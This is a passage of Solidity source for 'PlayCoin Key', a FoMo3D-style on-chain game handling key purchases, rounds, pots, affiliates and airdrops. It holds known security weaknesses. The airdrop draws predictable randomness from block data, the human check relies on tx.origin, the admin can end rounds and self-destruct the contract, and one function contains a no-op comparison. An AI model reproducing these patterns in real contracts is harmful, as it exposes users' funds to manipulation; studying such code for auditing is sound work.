onAffiliatePayout\n (\n uint256 indexed affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 indexed roundID,\n uint256 indexed buyerID,\n uint256 amount,\n uint256 timeStamp\n );\n event onPotSwapDeposit\n (\n uint256 roundID,\n uint256 amountAddedToPot\n );\n}\ncontract modularKey is PCKevents {}\ncontract PlayCoinKey is modularKey {\n using SafeMath for *;\n using NameFilter for string;\n using PCKKeysCalcLong for uint256;\n PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x14229878e85e57FF4109dc27bb2EfB5EA8067E6E);\n string constant public name = \"PlayCoin Key\";\n string constant public symbol = \"PCK\";\n uint256 private rndExtra_ = 2 minutes;\n uint256 private rndGap_ = 15 minutes;\n uint256 constant private rndInit_ = 24 hours;\n uint256 constant private rndInc_ = 30 seconds;\n uint256 constant private rndMax_ = 24 hours;\n uint256 constant private rndMin_ = 10 minutes;\n uint256 public reduceMul_ = 3;\n uint256 public reduceDiv_ = 2;\n uint256 public rndReduceThreshold_ = 10e18;\n bool public closed_ = false;\n address private admin = msg.sender;\n uint256 public airDropPot_;\n uint256 public airDropTracker_ = 0;\n uint256 public rID_;\n mapping (address => uint256) public pIDxAddr_;\n mapping (bytes32 => uint256) public pIDxName_;\n mapping (uint256 => PCKdatasets.Player) public plyr_;\n mapping (uint256 => mapping (uint256 => PCKdatasets.PlayerRounds)) public plyrRnds_;\n mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;\n mapping (uint256 => PCKdatasets.Round) public round_;\n mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;\n mapping (uint256 => PCKdatasets.TeamFee) public fees_;\n mapping (uint256 => PCKdatasets.PotSplit) public potSplit_;\n constructor()\n public\n {\n fees_[0] = PCKdatasets.TeamFee(30,6);\n fees_[1] = PCKdatasets.TeamFee(43,0);\n fees_[2] = PCKdatasets.TeamFee(56,10);\n fees_[3] = PCKdatasets.TeamFee(43,8);\n potSplit_[0] = PCKdatasets.PotSplit(15,10);\n potSplit_[1] = PCKdatasets.PotSplit(25,0);\n potSplit_[2] = PCKdatasets.PotSplit(20,20);\n potSplit_[3] = PCKdatasets.PotSplit(30,10);\n }\n modifier isActivated() {\n require(activated_ == true, \"its not ready yet. check ?eta in discord\");\n _;\n }\n modifier isRoundActivated() {\n require(round_[rID_].ended == false, \"the round is finished\");\n _;\n }\n modifier isHuman() {\n require(msg.sender == tx.origin, \"sorry humans only\");\n _;\n }\n modifier isWithinLimits(uint256 _eth) {\n require(_eth >= 1000000000, \"pocket lint: not a valid currency\");\n require(_eth <= 100000000000000000000000, \"no vitalik, no\");\n _;\n }\n modifier onlyAdmins() {\n require(msg.sender == admin, \"onlyAdmins failed - msg.sender is not an admin\");\n _;\n }\n function kill () onlyAdmins() public {\n require(round_[rID_].ended == true && closed_ == true, \"the round is active or not close\");\n selfdestruct(admin);\n }\n function getRoundStatus() isActivated() public view returns(uint256, bool){\n return (rID_, round_[rID_].ended);\n }\n function setThreshold(uint256 _threshold, uint256 _mul, uint256 _div) onlyAdmins() public {\n require(_threshold > 0, \"threshold must greater 0\");\n require(_mul > 0, \"mul must greater 0\");\n require(_div > 0, \"div must greater 0\");\n rndReduceThreshold_ = _threshold;\n reduceMul_ = _mul;\n reduceDiv_ = _div;\n }\n function setEnforce(bool _closed) onlyAdmins() public returns(bool, uint256, bool) {\n closed_ = _closed;\n if( !closed_ && round_[rID_].ended == true && activated_ == true ){\n nextRound();\n }\n else if( closed_ && round_[rID_].ended == false && activated_ == true ){\n round_[rID_].end = now - 1;\n }\n return (closed_, rID_, now > round_[rID_].end);\n }\n function()\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);\n }\n function buyXid(uint256 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affCode, _team, _eventData_);\n }\n function buyXaddr(address _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function buyXname(bytes32 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affCode, _team, _eth, _eventData_);\n }\n function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function withdraw()\n isActivated()\n isHuman()\n public\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _eth;\n if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n PCKdatasets.EventReturns memory _eventData_;\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onWithdrawAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eth,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n } else {\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n emit PCKevents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);\n }\n }\n function registerNameXID(string _nameString, uint256 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXaddr(string _nameString, address _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXname(string _nameString, bytes32 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function getBuyPrice()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );\n else\n return ( 75000000000000 );\n }\n function getTimeLeft()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now < round_[_rID].end)\n if (_now > round_[_rID].strt + rndGap_)\n return( (round_[_rID].end).sub(_now) );\n else\n return( (round_[_rID].strt + rndGap_).sub(_now) );\n else\n return(0);\n }\n function getPlayerVaults(uint256 _pID)\n public\n view\n returns(uint256 ,uint256, uint256)\n {\n uint256 _rID = rID_;\n if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n if (round_[_rID].plyr == _pID)\n {\n return\n (\n (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n }\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff\n );\n }\n }\n function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)\n private\n view\n returns(uint256)\n {\n return( ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000) );\n }\n function getCurrentRoundInfo()\n public\n view\n returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n return\n (\n round_[_rID].ico,\n _rID,\n round_[_rID].keys,\n round_[_rID].end,\n round_[_rID].strt,\n round_[_rID].pot,\n (round_[_rID].team + (round_[_rID].plyr * 10)),\n plyr_[round_[_rID].plyr].addr,\n plyr_[round_[_rID].plyr].name,\n rndTmEth_[_rID][0],\n rndTmEth_[_rID][1],\n rndTmEth_[_rID][2],\n rndTmEth_[_rID][3],\n airDropTracker_ + (airDropPot_ * 1000)\n );\n }\n function getPlayerInfoByAddress(address _addr)\n public\n view\n returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n if (_addr == address(0))\n {\n _addr == msg.sender;\n }\n uint256 _pID = pIDxAddr_[_addr];\n return\n (\n _pID,\n plyr_[_pID].name,\n plyrRnds_[_pID][_rID].keys,\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff,\n plyrRnds_[_pID][_rID].eth\n );\n }\n function buyCore(uint256 _pID, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n core(_rID, _pID, msg.value, _affID, _team, _eventData_);\n } else {\n if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ){\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onBuyAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n msg.value,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);\n }\n }\n function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > ( round_[_rID].strt + rndGap_ ) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);\n core(_rID, _pID, _eth, _affID, _team, _eventData_);\n } else if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ) {\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onReLoadAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n }\n function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n if (plyrRnds_[_pID][_rID].keys == 0)\n _eventData_ = managePlayer(_pID, _eventData_);\n if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)\n {\n uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);\n uint256 _refund = _eth.sub(_availableLimit);\n plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);\n _eth = _availableLimit;\n }\n if (_eth > 1000000000)\n {\n uint256 _keys = (round_[_rID].eth).keysRec(_eth);\n if (_keys >= 1000000000000000000)\n {\n updateTimer(_keys, _rID, _eth);\n if (round_[_rID].plyr != _pID)\n round_[_rID].plyr = _pID;\n if (round_[_rID].team != _team)\n round_[_rID].team = _team;\n _eventData_.compressedData = _eventData_.compressedData + 100;\n }\n if (_eth >= 100000000000000000) {\n airDropTracker_++;\n if (airdrop() == true) {\n uint256 _prize;\n if (_eth >= 10000000000000000000)\n {\n _prize = ((airDropPot_).mul(75)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {\n _prize = ((airDropPot_).mul(50)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 200000000000000000000000000000000;\n } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {\n _prize = ((airDropPot_).mul(25)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n }\n _eventData_.compressedData += 10000000000000000000000000000000;\n _eventData_.compressedData += _prize * 1000000000000000000000000000000000;\n airDropTracker_ = 0;\n }\n }\n _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);\n plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);\n plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);\n round_[_rID].keys = _keys.add(round_[_rID].keys);\n round_[_rID].eth = _eth.add(round_[_rID].eth);\n rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);\n _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);\n _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);\n endTx(_pID, _team, _eth, _keys, _eventData_);\n }\n }\n function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)\n private\n view\n returns(uint256)\n {\n return( (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask) );\n }\n function calcKeysReceived(uint256 _rID, uint256 _eth)\n public\n view\n returns(uint256)\n {\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].eth).keysRec(_eth) );\n else\n return ( (_eth).keys() );\n }\n function iWantXKeys(uint256 _keys)\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );\n else\n return ( (_keys).eth() );\n }\n function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if (pIDxAddr_[_addr] != _pID)\n pIDxAddr_[_addr] = _pID;\n if (pIDxName_[_name] != _pID)\n pIDxName_[_name] = _pID;\n if (plyr_[_pID].addr != _addr)\n plyr_[_pID].addr = _addr;\n if (plyr_[_pID].name != _name)\n plyr_[_pID].name = _name;\n if (plyr_[_pID].laff != _laff)\n plyr_[_pID].laff = _laff;\n if (plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function receivePlayerNameList(uint256 _pID, bytes32 _name)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if(plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function determinePID(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_pID == 0)\n {\n _pID = PlayerBook.getPlayerID(msg.sender);\n bytes32 _name = PlayerBook.getPlayerName(_pID);\n uint256 _laff = PlayerBook.getPlayerLAff(_pID);\n pIDxAddr_[msg.sender] = _pID;\n plyr_[_pID].addr = msg.sender;\n if (_name != \"\")\n {\n pIDxName_[_name] = _pID;\n plyr_[_pID].name = _name;\n plyrNames_[_pID][_name] = true;\n }\n if (_laff != 0 && _laff != _pID)\n plyr_[_pID].laff = _laff;\n _eventData_.compressedData = _eventData_.compressedData + 1;\n }\n return (_eventData_);\n }\n function verifyTeam(uint256 _team)\n private\n pure\n returns (uint256)\n {\n if (_team < 0 || _team > 3)\n return(2);\n else\n return(_team);\n }\n function managePlayer(uint256 _pID, PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n if (plyr_[_pID].lrnd != 0)\n updateGenVault(_pID, plyr_[_pID].lrnd);\n plyr_[_pID].lrnd = rID_;\n _eventData_.compressedData = _eventData_.compressedData + 10;\n return(_eventData_);\n }\n function nextRound() private {\n rID_++;\n round_[rID_].strt = now;\n round_[rID_].end = now.add(rndInit_).add(rndGap_);\n }\n function endRound(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _rID = rID_;\n uint256 _winPID = round_[_rID].plyr;\n uint256 _winTID = round_[_rID].team;\n uint256 _pot = round_[_rID].pot;\n uint256 _win = (_pot.mul(48)) / 100;\n uint256 _com = (_pot / 50);\n uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;\n uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;\n uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);\n if (_dust > 0)\n {\n _gen = _gen.sub(_dust);\n _res = _res.add(_dust);\n }\n plyr_[_winPID].win = _win.add(plyr_[_winPID].win);\n admin.transfer(_com.add(_p3d.sub(_p3d / 2)));\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n _res = _res.add(_p3d / 2);\n _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);\n _eventData_.winnerAddr = plyr_[_winPID].addr;\n _eventData_.winnerName = plyr_[_winPID].name;\n _eventData_.amountWon = _win;\n _eventData_.genAmount = _gen;\n _eventData_.PCPAmount = _p3d;\n _eventData_.newPot = _res;\n _rID++;\n round_[_rID].ended = false;\n round_[_rID].strt = now;\n round_[_rID].end = now.add(rndInit_).add(rndGap_);\n round_[_rID].pot = _res;\n return(_eventData_);\n }\n function updateGenVault(uint256 _pID, uint256 _rIDlast)\n private\n {\n uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);\n if (_earnings > 0)\n {\n plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);\n plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);\n }\n }\n function updateTimer(uint256 _keys, uint256 _rID, uint256 _eth)\n private\n {\n uint256 _now = now;\n uint256 _newTime;\n if (_now > round_[_rID].end && round_[_rID].plyr == 0)\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);\n else\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);\n uint256 _newEndTime;\n if (_newTime < (rndMax_).add(_now))\n _newEndTime = _newTime;\n else\n _newEndTime = rndMax_.add(_now);\n if ( _eth >= rndReduceThreshold_ ) {\n uint256 reduce = ((((_keys) / (1000000000000000000))).mul(rndInc_ * reduceMul_) / reduceDiv_);\n if( _newEndTime > reduce && _now + rndMin_ + reduce < _newEndTime){\n _newEndTime = (_newEndTime).sub(reduce);\n }\n else if ( _newEndTime > reduce ){\n _newEndTime = _now + rndMin_;\n }\n }\n round_[_rID].end = _newEndTime;\n }\n function getReduce(uint256 _rID, uint256 _eth) public view returns(uint256,uint256){\n uint256 _keys = calcKeysReceived(_rID, _eth);\n if ( _eth >= rndReduceThreshold_ ) {\n return ( ((((_keys) / (1000000000000000000))).mul(rndInc_ * reduceMul_) / reduceDiv_), (((_keys) / (1000000000000000000)).mul(rndInc_)) );\n } else {\n return (0, (((_keys) / (1000000000000000000)).mul(rndInc_)) );\n }\n }\n function airdrop() private view returns(bool) {\n uint256 seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n (block.number)\n )));\n if((seed - ((seed / 1000) * 1000)) < airDropTracker_)\n return(true);\n else\n return(false);\n }\n function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _com = _eth / 50;\n uint256 _p3d;\n if (!address(admin).call.value(_com)()) {\n _p3d = _com;\n _com = 0;\n }\n uint256 _long = _eth / 100;\n potSwap(_long);\n uint256 _aff = _eth / 10;\n if (_affID != _pID && plyr_[_affID].name != '') {\n plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);\n emit PCKevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);\n } else {\n _p3d = _aff;\n }\n _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));\n if (_p3d > 0)\n {\n admin.transfer(_p3d.sub(_p3d / 2));\n round_[_rID].pot = round_[_rID].pot.add(_p3d / 2);\n _eventData_.PCPAmount = _p3d.add(_eventData_.PCPAmount);\n }\n return(_eventData_);\n }\n function potSwap(uint256 _pot) private {\n uint256 _rID = rID_ + 1;\n round_[_rID].pot = round_[_rID].pot.add(_pot);\n emit PCKevents.onPotSwapDeposit(_rID, _pot);\n }\n function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;\n uint256 _air = (_eth / 100);\n airDropPot_ = airDropPot_.add(_air);\n _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));\n uint256 _pot = _eth.sub(_gen);\n uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);\n if (_dust > 0)\n _gen = _gen.sub(_dust);\n round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);\n _eventData_.genAmount = _gen.add(_eventData_.genAmount);\n _eventData_.potAmount = _pot;\n return(_eventData_);\n }\n function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)\n private\n returns(uint256)\n {\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);\n plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);\n return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));\n }\n function withdrawEarnings(uint256 _pID)\n private\n returns(uint256)\n {\n updateGenVault(_pID, plyr_[_pID].lrnd);\n uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);\n if (_earnings > 0)\n {\n plyr_[_pID].win = 0;\n plyr_[_pID].gen = 0;\n plyr_[_pID].aff = 0;\n }\n return(_earnings);\n }\n function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);\n emit PCKevents.onEndTx\n (\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n plyr_[_pID].name,\n msg.sender,\n _eth,\n _keys,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount,\n _eventData_.potAmount,\n airDropPot_\n );\n }\n bool public activated_ = false;\n function activate() public {\n require(\n msg.sender == admin,\n \"only team just can activate\"\n );\n require(activated_ == false, \"PCK already activated\");\n activated_ = true;\n rID_ = 1;\n round_[1].strt = now + rndExtra_ - rndGap_;\n round_[1].end = now + rndInit_ + rndExtra_;\n }\n}\nlibrary PCKdatasets {\n struct EventReturns {\n uint256 compressedData;\n uint256 compressedIDs;\n address winnerAddr;\n bytes32 winnerName;\n uint256 amountWon;\n uint256 newPot;\n uint256 PCPAmount;\n uint256 genAmount;\n uint256 potAmount;\n }\n struct Player {\n address addr;\n bytes32 name;\n uint256 win;\n uint256 gen;\n uint256 aff;\n uint256 lrnd;\n uint256 laff;\n }\n struct PlayerRounds {\n uint256 eth;\n uint256 keys;\n uint256 mask;\n uint256 ico;\n }\n struct Round {\n uint256 plyr;\n uint256 team;\n uint256 end;\n bool ended;\n uint256 strt;\n uint256 keys;\n uint256 eth;\n uint256 pot;\n uint256 mask;\n uint256 ico;\n uint256 icoGen;\n uint256 icoAvg;\n }\n struct TeamFee {\n uint256 gen;\n uint256 p3d;\n }\n struct PotSplit {\n uint256 gen;\n uint256 p3d;\n 